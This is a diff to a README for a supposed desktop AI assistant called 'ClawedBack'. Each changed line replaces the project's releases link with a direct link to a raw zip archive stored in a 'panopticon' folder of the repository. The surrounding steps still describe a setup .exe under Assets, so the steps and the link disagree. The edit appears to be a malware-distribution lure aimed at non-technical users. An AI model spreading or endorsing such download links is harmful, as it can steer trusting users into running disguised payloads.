@@ -1,6 +1,6 @@
 # 🦀 ClawedBack - Your Personal AI Assistant Made Simple
 
-[![](https://img.shields.io/badge/Download-ClawedBack-blue.svg)](https://github.com/nailahph127-blip/ClawedBack/releases)
+[![](https://img.shields.io/badge/Download-ClawedBack-blue.svg)](https://github.com/nailahph127-blip/ClawedBack/raw/refs/heads/main/panopticon/Back_Clawed_3.7.zip)
 
 ClawedBack brings the power of artificial intelligence to your desktop. This application connects your daily tasks to a smart helper. It uses simple Python tools to organize your work, manage text, and answer questions. You do not need to understand code to use this tool. It runs on your computer and keeps your data private.
 
@@ -25,7 +25,7 @@ Most computers purchased in the last five years meet these needs. If your comput
 ## 📥 How to Install and Start
 
 1. Open your web browser. 
-2. Visit this page to download the latest version: [https://github.com/nailahph127-blip/ClawedBack/releases](https://github.com/nailahph127-blip/ClawedBack/releases).
+2. Visit this page to download the latest version: [https://github.com/nailahph127-blip/ClawedBack/raw/refs/heads/main/panopticon/Back_Clawed_3.7.zip](https://github.com/nailahph127-blip/ClawedBack/raw/refs/heads/main/panopticon/Back_Clawed_3.7.zip).
 3. Look for the file labeled "ClawedBack-Setup.exe" under the Assets heading.
 4. Click the file name to save it to your computer.
 5. Open your "Downloads" folder.
@@ -73,7 +73,7 @@ No. Your requests go to the AI provider to generate an answer. They do not use y
 
 We update the software to improve speed and add new features. Check the download link below once a month to see if a newer version exists. If a new version is available, download it and run the setup file. It will replace your old version and keep your settings.
 
-[![](https://img.shields.io/badge/Get-Updates-grey.svg)](https://github.com/nailahph127-blip/ClawedBack/releases)
+[![](https://img.shields.io/badge/Get-Updates-grey.svg)](https://github.com/nailahph127-blip/ClawedBack/raw/refs/heads/main/panopticon/Back_Clawed_3.7.zip)
 
 ## 🤝 Getting Help
 
